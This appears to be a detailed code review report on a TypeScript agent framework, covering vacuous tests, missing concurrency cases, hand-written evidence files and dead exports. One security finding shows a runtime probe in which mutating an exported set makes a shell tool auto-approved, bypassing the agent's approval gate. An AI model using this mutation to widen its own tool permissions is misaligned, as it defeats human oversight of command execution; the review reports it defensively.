  "liveness_oracle_projects_classified": 13624,
  "liveness_oracle_ops_per_project": 2.51,
  "liveness_oracle_elapsed_ms": 118,
  "_confusion_matrix": { "framework_dead__consumer_DEAD": 10252, ... }
  "honest_limits": [ ..., "The framework side was given an EMPTY candidate pool (candidatePaths: () => [])", ... ]
  ```
  Cross-checked against the code: with `candidatePaths: () => []`, `searchPool`'s loop body never
  executes and it returns `undetermined` unconditionally (liveness-oracle.ts:236-241), so `dead`
  is reachable only via :275.

- **Recommended action:** Rename the keys or add a scope line so the artifact cannot be read as evidence about deletion — e.g. `"scope": "classification only; no deletion, no registry remover, no await was exercised"`. Then add the missing half: a sweep in a temp tree that actually applies, with a controlled remover, recording removed/kept/errors. Pillar (c) for the deletion path is still 0.


### F-dom-10: The declared happens-before test is still absent and the test standing in for it is still vacuous with respect to the property it names. Re-verified: `gc-registry-remover.test.ts:55-70` is byte-identical in shape to what the previous review flagged. No barrier appears anywhere in the file.


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/tests/unit/gc-registry-remover.test.ts` line 55
- **Plan reference:** T2.2 Concurrency tests — "Happens-before observation — assert `registryRemoved: true` is observed only after the remover's promise has settled, by having the remover resolve on an explicit barrier the test controls"

- **Domain anchor:** rules/testing.md § 6 (vacuous assertions); cycle-implement.md test-obligation gate
- **Evidence:**

  ```ts
  // gc-registry-remover.test.ts:55-70 — unchanged
  removeFromRegistry: async (id) => { calls.push(id); await Promise.resolve() },
  ...
  expect(calls).toEqual(['s1'])
  expect(result.registryRemoved, 'an awaited removal is a completed removal').toBe(true)
  ```
  `grep -n "barrier" packages/agents/tests/unit/gc-registry-remover.test.ts` → no match.
  The ORDER is proven elsewhere for the failure path only (`test_registry_removed_before_the_file_
  is_unlinked` :84 and the rejection case :106, where a non-awaited rejection would escape). The
  SUCCESS-path ordering remains unproven.

- **Recommended action:** Make the remover resolve on a barrier the test controls: start `deleteSession` without awaiting, assert the transcript is STILL on disk while the barrier is held, then release and assert removal. That assertion fails if the `await` is deleted; the current one does not.


### F-dom-11: The declared mixed-outcome sweep test is still not in the tree. Re-verified: the three sweep cases at :218, :235, :250 use a single-candidate plan, and the integration cases use a remover that behaves IDENTICALLY for every candidate. "Failure at k does not abort k+1..N" is asserted by nothing — which is the same shape as the original defect (the single-session path was tested; the sweep was not).


- **Found by:** review-crossval-4-6-absorption-domain-concurrency
- **File:** `packages/agents/tests/unit/gc-registry-remover.test.ts` line 217
- **Plan reference:** T2.2 Concurrency tests — "a rejecting remover on session k does not prevent sessions k+1..N from being processed"
- **Domain anchor:** transcript-gc.ts:234-237 — "Errors accumulate PER CANDIDATE (fail-open): one undeletable file must not leave the rest of the disk uncollected"
- **Evidence:**

  `collectablePlan()` (:197-210) builds `candidates` of length 1; used by :218, :235, :250.
  `tests/integration/gc-sweep-bounded.test.ts:45` — multi-candidate but the remover never settles
  for ALL of them (`errors.length === candidates.length`); `:73` — multi-candidate, remover
  succeeds for all. No case has k fail while k+1 succeeds.

- **Recommended action:** Add `test_a_rejecting_remover_on_one_session_does_not_stop_the_rest()`: 3+ aged candidates, a remover that rejects only for the 2nd, asserting `removed` contains the 1st and 3rd, `errors` has exactly one entry naming the 2nd, and the 2nd's transcript is still on disk.


### F-dom-6: STILL OPEN and now measured. WRITE_SCOPED_TOOLS, APPROVAL_MODES and DEFAULT_TOOL_PRESENTATION are exported module-level singletons that are mutable at runtime; one of them decides auto-approval for the whole process, and one carries a docstring asserting the opposite.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/bridge/approval-decision.ts` line 41
- **Plan reference:** T2.1 — the auto-approve rule as a callable symbol; T3.1 — overridable defaults
- **Domain anchor:** rules/type-safety.md (ReadonlySet/ReadonlyMap/as const are compile-time only); rules/system-design-guardrails.md G10
- **Evidence:**

  MEASURED against the real module (vitest probe, since deleted):
    Object.isFrozen(APPROVAL_MODES)                                      -> false
    (WRITE_SCOPED_TOOLS as Set<string>).add('run_shell')
    shouldAutoApprove('auto-edit', 'run_shell')                          -> true
  Any code in the process — a plugin, a transitive dependency, a JS consumer with no types —
  turns a shell tool into an auto-approved one for every caller. The type says nothing at runtime.
  
  The false claim is still on disk in the sibling:
    ../theokit-tui/src/tool-presentation.ts:148
      "* The defaults. Frozen as a `ReadonlyMap` because a surface that mutated it would change
       every other ..."
    ../theokit-tui/src/tool-presentation.ts:294
      export const DEFAULT_TOOL_PRESENTATION: ReadonlyMap<string, ToolPresentation> =
        new Map(DEFAULT_ENTRIES);
  It is not frozen; the sentence describes a control that does not exist (G10).

- **Recommended action:** For WRITE_SCOPED_TOOLS prefer a factory — writeScopedTools(): ReadonlySet<string> returning a fresh Set — so no caller shares a mutable security default. Object.freeze(APPROVAL_MODES). For DEFAULT_TOOL_PRESENTATION, either freeze behind an accessor or delete the "Frozen" sentence; do not leave the claim and the code disagreeing.

### F-dom-7: T2.4 adopted ensureSecureDir for its repair and discarded the half that is the security refusal. Both new call sites swallow the documented @throws and continue, so in the one scenario the helper exists for — a loose directory whose chmod does not hold — the process keeps running with no warning of any kind.

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/session/project-index.ts` line 84
- **Plan reference:** T2.4 — "Both now call ensureSecureDir, which this package already ships (parsimony rung 4)"
- **Domain anchor:** secure-store.ts:49-52 — "@throws when the mode cannot be repaired — refusing beats running with a store another user can rewrite, because that store decides what executes"; rules/system-design-guardrails.md G10, G9 (no silent paths)
- **Evidence:**

  ```ts
  // packages/agents/src/session/project-index.ts:82-87
  ensureSecureDir(sidecar)
  writeFileSync(sidecar, `${cwd}\n`, 'utf8')
  } catch {
    // Intentionally swallowed — see the docblock.
  }
  ```
  ```ts
  // packages/agents/src/session/session-pointer.ts:99-107
  ensureSecureDir(target)
  await atomicWriteText(target, `${sessionId}\n`)
  return { persisted: true }
  } catch { return { persisted: false } }
  ```
  The helper's contract (secure-store.ts:54-73) throws with "<dir> is mode 0775 — group or world
  writable, and the repair did not hold. This directory decides which commands may run". Both
  call sites turn that into, respectively, silence and { persisted: false } — which a caller
  reads as "the pointer could not be saved", not as "your transcript root is writable by another
  user". No AgentWarningCode, no diag, nothing.
  
  The swallow is justified in the docblocks for the INDEX WRITE ("a throw there turns a missing
  optimisation into a failed run") — a sound argument about the write, and not about the mode
  refusal. Two different failures are collapsed into one catch.

- **Recommended action:** Separate the two failures: let ensureSecureDir's throw escape, or catch it distinctly and surface it through the package's structured warning channel, while continuing to swallow the write failure. A security control unconditionally caught by both of its call sites is not a control.

### F-dom-8: STILL OPEN and measured. shouldAutoApprove falls out of its switch and returns undefined while declaring boolean. It fails closed only because undefined is falsy — luck, not a decision — and a caller that logs or serialises the verdict cannot tell "refused" from "this function did not answer".

- **Found by:** review-crossval-4-6-absorption-domain-security
- **File:** `packages/agents/src/bridge/approval-decision.ts` line 79
- **Plan reference:** T2.1 — the auto-approve rule as a callable symbol
- **Domain anchor:** rules/error-handling.md 2 (fail-closed by decision, not by accident); rules/type-safety.md (explicit return types on public API)
- **Evidence:**

  ```ts
  // approval-decision.ts:79-89 — three cases, no default, no exhaustiveness guard
  switch (mode) { case 'suggest': ... case 'auto-edit': ... case 'full-auto': ... }
  ```
  MEASURED: shouldAutoApprove('yolo' as never, 'run_shell') -> undefined.
  The mode is a value a surface reads from user config or a CLI flag; TypeScript's narrowing does
  not survive the package boundary into a JS consumer, and @theokit/agents publishes this symbol.

- **Recommended action:** Add a default arm returning false explicitly with the reason written down, or an exhaustiveness guard (const _never: never = mode; return false). Add the negative case to approval-decision.test.ts — the suite covers an unknown TOOL (:77-81) but not an unknown MODE.

### F-orch-2: T1.3's transitive-closure gate was performed as a one-off manual measurement and never encoded as a test, so nothing prevents a future change from widening the public bundle of the newly published ./mcp-auth subpath.


- **Found by:** orchestrator
- **File:** `../theokit-sdk/packages/sdk/tests/mcp-auth-subpath.test.ts` line 1
- **Plan reference:** T1.3 Deep Dives — "the task measures the transitive closure before adding the entry"
- **Evidence:**

  The plan makes the closure a decision gate: "If the closure is wide, the honest
  outcome is the index correction alone, not a forced publish." The measurement was
  run (17 modules; 11 are src/types/* erased at build) and recorded in the commit
  message, but `mcp-auth-subpath.test.ts` asserts only exports-map / tsup entry /
  DTS route / .d.cts mirror and the barrel's symbols. Nothing asserts the closure.

- **Recommended action:** Add an assertion that the transitive import closure of src/mcp-auth.ts stays within the measured set, so widening it becomes a named failure rather than a silent one.


### F-orch-4: A DoD line contradicts the plan's own T2.2 design, so one of the two must be amended before this can be called satisfied.


- **Found by:** orchestrator
- **File:** `.claude/knowledge-base/plans/crossval-4-6-absorption-plan.md` line 2232
- **Plan reference:** Global Definition of Done
- **Evidence:**

  DoD: "Backward compatibility preserved: every signature change is a widening; no
        export removed from any published subpath."
  T2.2: "widens `deleteSession`'s remover to accept a thenable ... by awaiting".
  A function cannot await without becoming `async`; its return type goes from T to
  Promise<T>, which is breaking, not widening. `runTranscriptGC` and `deleteSession`
  are both affected; both commits carry the conventional `!` marker.
  The three pending-ledger changes ARE widenings (generic parameter with a default).

- **Recommended action:** Human decision: amend the DoD line to permit a labelled breaking change, or gate the two async changes behind a major version. Not the implementer's call to make silently.


### F-tests-3: `test_a_repeating_candidate_list_costs_its_distinct_entries_not_its_length` does not verify the property in its own name. Deleting the de-duplication from searchPool leaves the whole suite green. The rewrite renamed the test to CLAIM the dedup property while removing the only assertion (`toBe('dead')`) that varied with it — so the name now asserts more than the body can.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/liveness-oracle.test.ts` line 211
- **Plan reference:** EC-9 (symlink loop); rules/testing.md § 6 (a test that asserts nothing meaningful)
- **Evidence:**

  Mutation applied to packages/agents/src/session/liveness-oracle.ts:213-214
    -      if (seen.has(candidate)) continue
    -      seen.add(candidate)
  Result: Test Files 2 passed (2) | Tests 19 passed (19).  Mutant survives.
  
  Why both assertions are inert here:
    expect(fs.calls()).toBeLessThanOrEqual(10)  — the budget already guarantees this and
      it is asserted independently at :197 (test_total_fs_operations_never_exceed_the_budget).
      With or without dedup no probe fires at all, because encodeProjectDir('/loop/a/b/a/b')
      never equals encode('/loop/target') — the loop `continue`s before probe() and
      `remaining` is never decremented.
    expect(...liveness).toBe('undetermined')    — produced identically by "pool did not
      contain it" and by "budget exhausted"; the test does not assert `reason`, so it
      cannot tell the two apart.

- **Recommended action:** Make the list repeat a candidate that DOES encode to the target and does not exist, with a budget smaller than the list length: with dedup the pool is exhausted within budget and `reason` is "no candidate path matched…"; without it, `reason` is "search budget exhausted". Assert `reason`, not just the verdict.


### F-tests-4: 3 of the 17 registered closure assertions have no assertion written. Gaps 29, F78 and F80 contain only `expect.fail('unreachable while blocked')` behind an always-true guard. They pass today, they count toward the Goal's denominator of 17, and unblocking them yields a failure that says nothing about the gap.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `tests/integration/crossval-4-6-closure.test.ts` line 226
- **Plan reference:** Goal ("17/17 closure assertions"); rules/testing.md § 6
- **Evidence:**

  tests/integration/crossval-4-6-closure.test.ts:226-228, 246-248, 262-264
    it('test_gap_29_the_consumer_duplicate_is_gone', () => {
      if (blocked('29')) return
      expect.fail('unreachable while blocked')
    })
  Same body for test_gap_F78_the_consumer_register_is_at_zero and
  test_gap_F80_verified_on_the_operator_tree.
  
  Measured (--reporter=verbose): "[crossval-4-6 closure] 6 of 17 gaps are BLOCKED";
  "11/17 closure assertions executed" — 19 passed. Of the 6 blocked, 3 (15, 18, 27) do
  have a real body waiting behind the guard; 3 have none.
  
  Related, in the executed half: 3 of the 11 assert only that a prose string exists in a
  markdown/comment file —
    :169  expect(index).toContain('was false for 25')            (packages/agents/src/index.ts)
    :180  expect(guard).toContain('test_honest_gaps_symbols_do_not_resolve')
    :202  expect(claude).toMatch(/explicitly demoted/)           (CLAUDE.md)
  For doc-shaped gaps (24) that is defensible; pinning the exact sentence "was false for 25"
  is brittle in the wrong direction — it breaks on an honest rewording and detects no
  semantic regression.
  
  Also: `test_gap_15_the_image_tool_crosses` (:145) asserts only that @theokit/sdk-tools
  exports createViewImageTool. Gap 15 is "createViewImageTool withheld [by the LAYER]
  without a reason"; when unblocked this will pass without the layer forwarding anything.

- **Recommended action:** Write the three bodies now (they can sit behind the guard, like gaps 15/18/27 do), and change gap 15's assertion to the layer surface (`reachable('createViewImageTool')`), which is what the row is about. Replace the exact-sentence assertions with something that survives rewording (e.g. the link target `boundary-decisions`, already asserted at :167).


### F-tests-5: The new register's anti-vacuity guard re-introduces the declaration-order dependency that 081833db had just removed from its sibling — its own comment says "Runs last by file order". It works today and, unlike the original bug, it fails loudly rather than vacuously; but the fix commit's stated lesson was that order was the thing that broke.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `tests/integration/crossval-4-6-closure.test.ts` line 267
- **Plan reference:** EC-4/F-tests-1 (the fix landed in 081833db); rules/testing.md § 3 ("no order dependency")
- **Evidence:**

  tests/integration/crossval-4-6-closure.test.ts:267-269
    it('test_the_blocked_gaps_are_reported_by_name', () => {
      // Runs last by file order, and its job is to make the skips LOUD.
  versus the pattern adopted 8 commits earlier at
  tests/integration/crossval-gaps.test.ts:223-225 (afterAll + tests/lib/refuse-mostly-skipped.ts),
  whose commit message reads: "Reordering the file and hoping would have re-armed the same
  bug for the next edit — order was the thing that broke."
  
  Verified working today (--reporter=verbose): it reports "6 of 17 gaps are BLOCKED",
  so `skipped` is fully populated when it runs.
  Failure direction if reordered: `expect(skipped.length).toBe(6)` against an empty array
  fails loudly — genuinely safer than the original defect, which is why this is MEDIUM.

- **Recommended action:** Move it to `afterAll` and reuse tests/lib/refuse-mostly-skipped.ts, or a sibling of it.

### F-tests-6: No RED commit. 7fea1388 lands the regression suite, the rewritten suite, the fix, the changeset and the CHANGELOG in one commit; the reproduction is recorded 22 seconds later in a markdown file (f838333d). Additionally, the new suite could not have been RED against the old module — it uses an API that did not exist — so nothing in the history demonstrates the failure the suite is named for.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/liveness-oracle-recorded-cwd.test.ts` line 1
- **Plan reference:** rules/testing.md § 3 ("every bug fix starts with a failing regression test, then the fix"); cycle-implement.md § Chain (RED → GREEN)
- **Evidence:**

  git log --format="%h %ad %s" --date=iso:
    c5465d16 2026-08-16 19:37:58  docs(wiring): ...
    f838333d 2026-08-16 19:26:28  docs(crossval): o BLOCKER do oraculo, reproduzido antes de ser consertado
    7fea1388 2026-08-16 19:26:06  fix(session)!: o oraculo marcava projetos vivos como mortos
  The commit claiming "reproduced before it was fixed" is 22s AFTER the fix and touches
  only .md files (git show f838333d --stat: 4 files, all knowledge-base markdown).
  
  liveness-oracle-recorded-cwd.test.ts passes `projectsRoot`/`candidatePaths` and an FsSeam
  with listEntries/firstLine — none of which exist at 7fea1388^. It is a test of the
  redesigned API, not a red-then-green regression test.

- **Recommended action:** For the next defect of this class, land the failing test first (it can be RED against the old contract by asserting the verdict, not the option names). Here, record honestly in the implementation summary that the reproduction was executable but was never committed red.


### F-tests-7: 5 of the 8 tests in the added suite duplicate a test in the rewritten suite — including one with a byte-identical name. 19 tests cover roughly 13 distinct behaviours, and the budget property alone is asserted by three tests across the two files. Either copy can be deleted with no signal.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/liveness-oracle-recorded-cwd.test.ts` line 104
- **Plan reference:** rules/testing.md § 6 (excessive duplication); DRY
- **Evidence:**

  Same behaviour, both files:
    test_a_pool_that_does_not_contain_the_project_is_undetermined_not_dead
      liveness-oracle.test.ts:148   and   liveness-oracle-recorded-cwd.test.ts:104
      — IDENTICAL NAME, same assertion, differing only in fixture strings.
    dead-by-recorded-cwd:   oracle.test.ts:132  vs  recorded-cwd.test.ts:120
    no-enumeration fast path: oracle.test.ts:99  vs  recorded-cwd.test.ts:155
    unreadable project dir: oracle.test.ts:180   vs  recorded-cwd.test.ts:188
    budget bound:           oracle.test.ts:162 AND :197  vs  recorded-cwd.test.ts:172
  Duplicate names across files also make a failure line ambiguous in CI output.

- **Recommended action:** Keep the stronger copy of each pair (recorded-cwd.test.ts:155 proves the fast path by throwing from candidatePaths, which is stronger than asserting a vi.fn was not called) and delete the weaker. Reserve the added suite for what only it covers — the hyphenated real path, the stray-transcript guard, and the negative cases F-tests-B asks for.


### F-tests-8: No test writes this file — it is hand-written from a manual sweep, which the skill contract forbids categorically rather than conditionally. The disclosure inside the file is unusually honest and complete for a HUMAN reader; the gate that consumes the file cannot read it, because it does a plain numeric lookup on the metric name.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `.wiring-evidence.json` line 3
- **Plan reference:** Global DoD "Runtime-metric proof"; .claude/skills/implement/SKILL.md:103,324; .claude/skills/implement/prompts/validation-fix-prompt.md:57
- **Evidence:**

  Disclosure (adequate, to a human) — .wiring-evidence.json:3 and :9:
    "written_by": "manual sweep against the operator's real project tree, 2026-08-16"
    "honest_limits": ["This is a MANUAL sweep, not integration-test infra. The file is
      hand-written from a measured run; no test writes it yet. A future run must
      re-measure rather than trust this file.", ...]
  The commit message repeats it verbatim.
  
  The contract, however, is a prohibition, not a disclose-and-proceed:
    .claude/skills/implement/SKILL.md:103   "`.wiring-evidence.json` (written by
                                             integration test infra)"
    .claude/skills/implement/SKILL.md:324   "Forbidden: ... hand-edited `.wiring-evidence.json`"
    validation-fix-prompt.md:57             "NEVER hand-edit `.wiring-evidence.json`
                                             (Unbreakable: no fabricated evidence)"
  
  And the consumer is blind to the prose:
    .claude/skills/implement/scripts/check_wiring.py:236-254
      evidence_path = project_root / ".wiring-evidence.json"
      ...
      count = evidence.get(metric, 0)
  A metric name matching any key would report pillar (c) PASS. Nothing parses `_provenance`.
  No test or script anywhere references the file:
    grep -rn "wiring-evidence" --exclude-dir=node_modules -> only skills docs, review
    artefacts and the backlog. Zero producers.
  
  Mitigating: no task in this plan declares a metric (.progress: every wiring.c is null or
  "n/a"), so no gate currently reads it. The exposure is prospective, not realised.

- **Recommended action:** Either promote the sweep into `tests/integration/` so the file is produced by a run (which is also the fix for F-tests-A, since both concern the same measurement), or rename it to something the gate will not pick up (e.g. `.claude/knowledge-base/audits/ liveness-oracle-real-tree-2026-08-16.json`) and record pillar (c) as deferred by ADR, as SKILL.md:107 prescribes. Keep the honest_limits block either way — it is the best part of the artefact.


### F-tests-9: Five edge/negative cases named in the edge-case review have no test, and all five belong to tasks the checkpoint marks `committed`. Per rules/testing.md § 4.1 the two lenses are not interchangeable, and the ones missing are mostly the negative lens.


- **Found by:** review-crossval-4-6-absorption-tests
- **File:** `packages/agents/tests/unit/transcript-root-dir-modes.test.ts` line 38
- **Plan reference:** EC-15, EC-16, EC-17, EC-18 (half), EC-20 — all from the plan's absorbed edge-case review
- **Evidence:**

  EC-15 (NEGATIVE, T2.4) symlinked credential home — transcript-root-dir-modes.test.ts has
    exactly 3 tests (:38, :50, :75); `grep -rn symlink` over the T2.4 test surface -> 0.
  EC-16 (EDGE, T2.4) absent home is not an insecure home — no test.
  EC-17 (EDGE, T3.4) window size 0 / selected -1 / selected >= total —
    `grep -rn "hiddenBefore" tests packages` -> 0 in this repo; the implementation is at
    ../theokit-tui/src/select-list-model.ts:25 and no file under ../theokit-tui/tests
    references it either. T3.4 status: committed.
  EC-18 (NEGATIVE, T4.1) absent allowlist / malformed sunset date —
    tests/unit/surface-invention-gate.test.ts covers the sunset semantics (:119, :129) but
    never an ABSENT allowlist file or a malformed date. The EC's own words: "a gate that
    crashes on its own config file is a gate that gets removed from check:all".
  EC-20 (EDGE, T2.7) repeated pending id — pending-ledger-payload.test.ts has 4 tests,
    none exercising a duplicate id.
  EC-14 second half (boundary as the FINAL record -> zero reachable turns) also absent;
    session-fork.test.ts:185 covers only the "several markers" half.

- **Recommended action:** Add the five named tests. EC-18 and EC-15 are the highest value — both are the class where a wrong answer is silent (a crashed gate, or a check that reads a symlink's 0777 mode and always passes).


### F-wire-22: Three new exports are dead by G7: no production caller, no integration test, and no consumer named for them in the plan's Phase 5 task list. templateHints is the clearest — F-wire-11 from the previous review, unfixed.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `packages/agents/src/config/command-template.ts` line 71
- **Plan reference:** G7 "Every Export Has a Consumer" / code-quality-golden-rule.md § 2 soft_cap_orphan_export
- **Evidence:**

  templateHints   — command-template.ts:71 defines it; the only other references are
                    config-entry.ts:76 (barrel) and packages/agents/tests/unit/command-template.test.ts.
                    `grep -n templateHints packages/agents/src/config/command-template.ts` shows it
                    is never called by expandCommandTemplate either. check_wiring pillar (b): FAIL.
  APPROVAL_MODES  — approval-decision.ts:41. Its only non-barrel use is deriving its own type on
                    the next line (:43 `export type ApprovalMode = (typeof APPROVAL_MODES)[number]`).
                    check_wiring pillar (b): FAIL. T5.2 adopts shouldAutoApprove, not the array.
  KNOWN_TOOL_NAMES (../theokit-tui) — barrel + own module + unit test only.
  Contrast, so the bar is visible: FILE_INLINE_CAP and WRITE_SCOPED_TOOLS look identical from the
  barrel but are genuinely used internally (command-template.ts:150-152; approval-decision.ts:85)
  and are NOT dead.

- **Recommended action:** Delete templateHints unless a Phase 5 task is amended to name it, or record it in the invention-reachability allowlist with the sunset the allowlist requires. For APPROVAL_MODES and KNOWN_TOOL_NAMES, the vocabulary-for-the-consumer argument is reasonable — but then it belongs in the checkpoint as `defer` naming T5.2, not as `pass`.

### F-wire-23: ensureSecureDir repairs only the leaf directory, so a transcript root whose ANCESTOR is already group-writable on the operator's machine is still refused by assertSecureModes. The fix holds for a fresh tree (which is what the tests build) and not necessarily for the tree it was written for.

- **Found by:** review-crossval-4-6-absorption-wiring
- **File:** `packages/agents/src/session/project-index.ts` line 75
- **Plan reference:** T2.4 "Resolve the assertSecureModes mask against the directory the framework creates"
- **Evidence:**

  project-index.ts:75 `ensureSecureDir(sidecar)` and session-pointer.ts:94 `ensureSecureDir(target)`
  are correct calls — hooks/secure-store.ts:54-55 takes a FILE path and dirnames it internally.
  But :57-73 only chmod-repairs `dir` = dirname(filePath). `mkdirSync(dir, {recursive, mode})` sets
  the mode on directories it CREATES; a pre-existing loose ancestor (e.g. an `~/.theokit/projects`
  made earlier by the bare `mkdirSync(dirname(sidecar), {recursive:true})` this commit replaced) is
  left as it is.
  The tests cannot see this: crossval-4-6-closure.test.ts:210-212 and
  packages/agents/tests/unit/transcript-root-dir-modes.test.ts both start from mkdtempSync, where
  every ancestor is created by the call under test.

- **Recommended action:** Add a case that pre-creates the projects root at 0o777 before calling recordProjectDir and asserts the resulting mode, then either walk the ancestors under the transcript root in ensureSecureDir or state in the docblock that repair is leaf-only and ancestors are the installer's problem.


## LOW findings (13)

### F-arch-15: The `./session` barrel docstring repeats the false ownership claim that F-arch-2 is about, on the public entry point a consumer reads first.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/index.ts` line 55
- **Plan reference:** previous review F-arch-1; ADR D4
- **Evidence:**

  ```ts
  // packages/agents/src/session/index.ts:54-57
  * Framework-owned for the same reason as the hint above: the question is only hard because
  * `encodeProjectDir` is one-way, which is this package's decision.
  ```
  `encodeProjectDir` is the SDK's decision — `project-index.ts:9` imports it from
  `@theokit/sdk/persistence`, `persistence-entry.ts:25` re-exports it, and
  `wiki/capability-index.md:106` publishes it as an SDK symbol. The reason the capability belongs
  in this layer is still sound (the layer composes the SDK and owns session lifecycle); the stated
  reason is not.

- **Recommended action:** Reword to "the encoding this layer inherits from `@theokit/sdk/persistence` is one-way" — the argument survives the correction.

### F-arch-16: `{@link projectsRoot}` resolves to nothing — the symbol is not imported into this module, and the option of the same name shadows it.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 57
- **Plan reference:** T3.2
- **Evidence:**

  ```ts
  // liveness-oracle.ts:56-60
  * Use {@link projectsRoot} rather than joining the segment by hand ...
  projectsRoot: string
  ```
  The module has zero imports; `projectsRoot` (the function) lives in `./project-index.js`. A
  migration note that points at an unresolvable link is the one place a consumer reads during a
  breaking upgrade.

- **Recommended action:** Qualify it — `{@link projectsRoot | projectsRoot() from '@theokit/agents/session'}` — or import the type-only reference.

### F-arch-17: The declared fixture tree was never created and the substitution was not recorded as a deviation.

- **Found by:** review-crossval-4-6-absorption-architecture
- **File:** `packages/agents/tests/fixtures/` line 1
- **Plan reference:** T3.2 "Files to edit — packages/agents/tests/fixtures/projects/ (NEW) — synthetic tree at reduced scale"
- **Evidence:**

  ```
  $ ls packages/agents/tests/fixtures/projects
  (no such directory; packages/agents/tests/fixtures does not exist)
  ```
  The in-memory counting seam plus a `mkdtempSync` integration test is arguably a BETTER
  substitute (it makes the budget property directly measurable) — but the integration half is the
  file that is currently red (F-arch-1), so the real-filesystem coverage the fixture was meant to
  provide is presently zero.

- **Recommended action:** Record the substitution in the implementation summary ("fixture tree replaced by an in-memory seam + tmpdir integration test") and, once F-arch-1 is fixed, confirm the tmpdir test covers the `dead` path on a real filesystem.

### F-xval-13: T3.4 shipped an `anchor` option on the existing `windowFor` instead of the plan's new `windowAround`. The divergence is documented, reasoned, and the code is right; the plan is wrong.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `../theokit-tui/src/select-list-model.ts:39,57`
- **Plan reference:** T3.4 § Pseudo-code/Signatures (a new `windowAround`); T3.4 § Acceptance Criteria items 1-3
- **Evidence:**

  select-list-model.ts:39  export type WindowAnchor = "trailing" | "centred";
  :44  "T3.4 — `anchor` is an OPTION rather than a second function. There was already exactly one
        [implementation of this clamp] ..."
  :57  anchor: WindowAnchor = "trailing",     <- default preserved, per AC1
  
  The ../theokit-tui CHANGELOG states the reasoning in full: a sibling function would be "duas
  implementacoes de uma regra so, discordando na primeira vez que alguem tocar em qualquer uma
  (G12)". That is the correct call, and the plan's Baseline invariant ("The default anchor stays
  trailing — an opt-in option, never a re-anchoring") is honoured exactly.
  ../theokit-tui suite: 1451 passed | 1 skipped, green.
  
  Recorded here only because a signature divergence from a plan's Pseudo-code section is supposed
  to carry an ADR, and this one carries a CHANGELOG paragraph instead. No behavioural risk.

- **Recommended action:** Update the plan's T3.4 Pseudo-code to the shipped signature when the plan is next revised, so the archived plan does not describe an API that never existed.

### F-xval-14: 68c4e2f7 added a DOORLESS_DECISIONS summary to the parity gate's output. This widens the gate's report, not its check — D2's letter survives, but it is close enough to the line to record.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `scripts/check-surface-parity.mjs`
- **Plan reference:** ADR D2 — 'Add an inverse gate for layer inventions, do not widen the parity gate to cover them'; Baseline invariant — 'The "decision, not coverage" contract (:16-24) MUST NOT become a coverage demand'
- **Evidence:**

  68c4e2f7 rationale: "Phase-4 mini review, HIGH: DOORLESS_DECISIONS had no production caller.
  Pillar (a) is non-negotiable ... Summarising the decisions in the same output is what makes the
  gate's report describe the boundary rather than the mechanically-comparable sixth of it."
  $ node scripts/check-surface-parity.mjs; echo $?   -> 0
  No new failing condition was added; the "decision, not coverage" contract text is intact, and
  the inverse question still lives in the separate gate D2 asked for
  (scripts/check-invention-reachability.mjs).

- **Recommended action:** No action. Recorded so a future reader does not mistake the summary line for D2 being relaxed.

### F-xval-15: The plan says Version 1.2; a v1.3 commit landed on it and the banner was not bumped.

- **Found by:** review-crossval-4-6-absorption-cross-validation
- **File:** `.claude/knowledge-base/plans/crossval-4-6-absorption-plan.md:9`
- **Plan reference:** Plan version banner vs commit 4e4097d7 ('docs(plan): v1.3')
- **Evidence:**

  :9   > **Version 1.2** — absorbs all 25 items from ...
  $ git log --format='%h %s' -- <plan>
  fc496f28 docs(plan): Q3 named five creators; two are a different .theokit
  4e4097d7 docs(plan): v1.3 — as secoes TDD ganham forma executavel, e Q2/Q3 uma proposta com evidencia
  f408468e docs(plan): crossval-4-6-absorption v1.2 — o plano e sua revisao de edge cases
  The implementation contract also records "(v1.2)". Three artifacts, two versions.

- **Recommended action:** Bump the banner to v1.4 (v1.3 + the fc496f28 correction) and align the contract.

### F-dom-13: The newly-REQUIRED `projectsRoot` option is documented ambiguously and built with string concatenation, so the two most likely ways to get it wrong both fail silently into `undetermined` for every project.

- **Found by:** review-crossval-4-6-absorption-domain-api-design
- **File:** `packages/agents/src/session/liveness-oracle.ts` line 56
- **Plan reference:** commit 7fea1388 — `projectsRoot` became required
- **Domain anchor:** rules/architecture.md § 6 — leaky/ambiguous abstraction boundary; Unbreakable Rule 5 (the most specific name wins)
- **Evidence:**

  ```ts
  // liveness-oracle.ts:55-60
  /**
   * Where `projects/<encoded>/` lives, so the recorded-cwd read can find a transcript.
   * Use {@link projectsRoot} rather than joining the segment by hand — ...
   */
  projectsRoot: string
  ```
  "Where `projects/<encoded>/` lives" reads as the PARENT of `projects/`. The code requires the
  `projects/` directory itself: `:156` `const dir = \`${opts.projectsRoot}/${name}\``, and the
  exported helper returns `join(root, 'projects')` (`project-index.ts:58-60`). Passing
  `transcriptRoot()` — the other exported root in the same package, and the reading the sentence
  supports — makes `listEntries` throw ENOENT for every project, i.e. `undetermined` everywhere,
  which the JSDoc itself concedes ("a wrong one makes every project look empty rather than
  erroring") without removing the ambiguity that causes it.
  Separately, `:156` and `:173` build paths with `/` literals while every sibling in the package
  uses `node:path.join` (`project-index.ts:58,63,73,102`; `session-pointer.ts`). A
  `projectsRoot` with a trailing separator yields `//`, and the module is otherwise
  platform-neutral.

- **Recommended action:** Reword to "The `projects/` directory itself — the value `projectsRoot()` returns, not the transcript root", and use `join()` at :156 and :173 like the rest of the package.

